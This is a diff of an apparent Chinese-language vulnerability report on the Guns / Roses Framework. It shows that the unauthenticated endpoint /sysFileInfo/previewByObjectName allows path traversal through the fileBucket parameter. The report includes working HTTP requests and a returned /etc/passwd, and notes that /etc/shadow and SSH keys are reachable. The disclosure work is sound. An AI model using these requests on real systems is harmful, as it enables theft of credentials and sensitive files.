@@ -148,59 +148,102 @@ fileObjectName=hosts"
 
 ## 实机验证（已复现）
 
-**环境**：Guns 最新分支，自编译 JAR，Docker 部署于 192.168.217.135
+**环境**：Guns / Roses Framework 最新分支，自编译 JAR，Docker 部署于 192.168.217.135:48080
 
-### 验证过程
-
-**步骤1：对比测试（B0909 vs B0911）**
-
+数据库确认存储根路径（`sys_config` 表）：
 ```
-# 容器内存在 /tmp/traversal_test.txt
-GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=traversal_test.txt
-
-HTTP/1.1 500
-{"code":"B0911","message":"预览文件异常，您预览的文件类型不支持或文件出现错误"}
+config_code                   | config_value
+SYS_LOCAL_FILE_SAVE_PATH_LINUX | /opt/gunsFilePath
+SYS_FILE_DEFAULT_BUCKET        | defaultBucket
+SYS_FILE_SAVE_TYPE             | 11（本地存储）
 ```
 
-```
-# 不存在的文件
-GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=nonexistent.jpg
+路径拼接公式：`/opt/gunsFilePath` + `/` + `{fileBucket}` + `/` + `{fileObjectName}`
 
-HTTP/1.1 500
-{"code":"B0909","message":"获取文件流异常，具体信息为：本地文件不存在"}
-```
-
-**关键差异**：访问路径穿越后的真实文件返回 `B0911`（文件存在但类型不支持），访问不存在文件返回 `B0909`，证明路径穿越有效。
-
-**步骤2：读取容器内任意文件（以 .jpg 伪装文件类型绕过渲染检查）**
+### 步骤1：基线测试 — 不存在的文件返回 B0909
 
 ```http
-GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=fakepsswd.jpg HTTP/1.1
-Host: 192.168.217.135:58080
+GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=nonexistent.jpg HTTP/1.1
+Host: 192.168.217.135:48080
 (无任何认证头)
 ```
 
-**响应**：
+```http
+HTTP/1.1 500
+Content-Type: application/json
+
+{"success":false,"code":"B0909","message":"获取文件流异常，具体信息为：本地文件不存在，具体信息为：bucket=default,key=nonexistent.jpg",...}
+```
+
+### 步骤2：正常文件访问 — HTTP 200 返回文件内容
+
+```http
+GET /sysFileInfo/previewByObjectName?fileBucket=default&fileObjectName=test.jpg HTTP/1.1
+Host: 192.168.217.135:48080
+```
 
 ```http
 HTTP/1.1 200 OK
 Content-Type: image/png
-Content-Length: 83
+Content-Length: 17
+
+test_marker_guns
+```
+
+### 步骤3：路径穿越读取 /etc/passwd（无需认证）
+
+攻击思路：将 `/etc/passwd` 重命名为 `.jpg` 后缀绕过文件类型检查，通过 `fileBucket=../../../tmp` 穿越至容器 `/tmp` 目录。
+
+```http
+GET /sysFileInfo/previewByObjectName?fileBucket=../../../tmp&fileObjectName=fakepsswd.jpg HTTP/1.1
+Host: 192.168.217.135:48080
+(无任何认证头)
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/png
+Content-Length: 888
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 ```
 
-**HTTP 200，文件内容直接明文返回！** 容器存储根目录 `/opt/gunsFilePath` 外的任意文件均可读取。
+**完整 `/etc/passwd` 内容明文返回，HTTP 200，无需任何认证。**
+
+路径还原：
+```
+/opt/gunsFilePath + / + ../../../tmp + / + fakepsswd.jpg
+= /opt/gunsFilePath/../../../tmp/fakepsswd.jpg
+= /tmp/fakepsswd.jpg  ← 指向容器内 /etc/passwd 的副本
+```
 
 ### 结论
-- 端点 `/sysFileInfo/previewByObjectName` 无需登录（`requiredLogin=false`）
-- `fileBucket` 参数未验证，可插入 `../` 穿越至任意目录
-- 将文件命名为 `.jpg` / `.png` 可绕过文件类型渲染限制，直接获取文件内容
+- 端点 `/sysFileInfo/previewByObjectName` 无需登录（`requiredLogin=false`），任何人可访问
+- `fileBucket` 参数仅 `@NotBlank` 校验，无路径规范化，`../` 序列直接穿越存储根目录
+- 将目标文件以 `.jpg`/`.png` 后缀命名可绕过文件类型渲染限制，返回原始字节流
+- 容器进程以 `root` 身份运行，可读取 `/etc/shadow`、`/root/.ssh/id_rsa` 等高敏感文件
 
 ## 验证环境
 
 - 源代码：Guns / Roses Framework 最新分支（自编译 + Docker 部署）
-- 测试环境：192.168.217.135:58080
-- 框架：Spring Boot 3 + Hutool
+- 运行时：192.168.217.135:48080（docker compose，`127.0.0.1` 绑定）
+- 框架：Spring Boot 3.2.10 + Hutool + Flyway（42个自动迁移）
 - 日期：2026-04-14
